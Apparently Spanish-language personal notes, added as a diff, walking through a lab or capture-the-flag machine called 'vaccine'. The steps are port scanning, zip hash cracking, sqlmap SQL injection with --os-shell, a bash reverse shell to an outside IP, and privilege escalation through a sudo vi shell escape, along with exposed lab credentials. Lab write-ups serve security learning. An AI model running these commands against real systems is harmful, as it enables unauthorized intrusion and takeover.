@@ -1,0 +1,62 @@
+
+	10.129.59.216
+	
+	nmap
+	
+		21 (descargar .zip)
+		22
+		80 
+		
+	descomprimir zip
+	
+		zip2john
+		
+		crear un fichero hash.txt
+		
+			backup.zip:$pkzip$2*1*1*0*8*24*5722*... hasta el final *$/pkzip$::backup.zip:index.php,style.css
+			
+		Ahí están las credenciales
+		
+			user > admin
+		
+			pass > 2cb42f8734ea607eefed3b70af13bbd3 > qwerty789
+			
+	Buscador (inyección)
+	
+		sqlmap -u 'http://10.129.59.216/dashboard.php?search=any+query' --cookie="PHPSESSID=s8di1kgd67kkd9issnq3epv492"
+		
+			GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+		
+		sqlmap -u 'http://10.129.59.216/dashboard.php?search=any+query' --cookie="PHPSESSID=s8di1kgd67kkd9issnq3epv492" --os-shell
+		
+		
+		
+		bash -c "bash -i >& /dev/tcp/10.10.15.9/443 0>&1"
+		
+		sudo nc -lvnp 443 (se ejucta la shell)
+		
+		
+		cat dashboard.php
+		
+		$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+		ssh -L 8080:localhost:5432 postgres@10.129.59.216 (USUARIO)
+		
+		sudo -l 
+		
+			Matching Defaults entries for postgres on vaccine:
+				env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
+				XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+				mail_badpass
+
+			User postgres may run the following commands on vaccine:
+				(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+		sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+		ESC
+		
+		:!/bin/bash
+		
+		INTRO
+		
